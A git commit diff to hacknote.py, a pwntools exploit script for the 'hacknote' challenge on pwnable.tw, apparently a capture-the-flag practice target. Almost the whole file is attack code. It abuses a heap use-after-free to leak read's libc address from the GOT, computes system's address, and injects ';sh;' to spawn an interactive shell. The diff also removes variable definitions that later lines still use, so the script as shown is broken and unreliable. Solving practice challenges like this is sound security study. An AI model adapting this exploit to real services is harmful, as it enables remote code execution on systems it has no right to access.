39a69112541779daf68d7fd1361c0bd72638e5e8
shinmao <shinmaox2016@gmail.com>
2017-10-23 13:01:45 +0800

    make my payload of hacknote.py more perfect

--- hacknote.py
+++ hacknote.py
@@ -4,6 +4,10 @@ from pwn import *
 r = remote("chall.pwnable.tw",10102)
 libc = ELF('libc_32.so.6')
 elf = ELF('./hacknote')
+read_got = elf.got['read']
+read_off = libc.symbols['read']
+system_off = libc.symbols['system']
+puts = 0x804862b
 
 def ad(size,content):
         r.recvuntil(":")
@@ -25,27 +29,28 @@ def dump(index):
         r.recvuntil(":")
         r.sendline(str(index))
 
-puts = 0x804862b
 ad(32,"ddaa")  #0
 ad(32,"ddaa")  #1
 de(0)
 de(1)
-read_got = elf.got['read']     #got of read
-libc_read_got = libc.symbols['read']    #offset of read
-libc_system_got = libc.symbols['system']     #offset of system
 
 payload = p32(puts)+p32(read_got)
 ad(8,payload)
 #now, we will write into read_got
+
+#leak address
 dump(0)
 r.recvuntil(":")
 read_addr = u32(r.recv(4))
 libc = read_addr - libc_read_got
 system_addr = libc + libc_system_got
+
 de(2)
 ad(8,p32(system_addr)+";sh;")
+#ad(8,p32(system_addr+"||sh"))
 #printf -> system
-#system(system;sh;)
+#system(${system};sh;)
+
 dump(0)
 r.interactive()
 
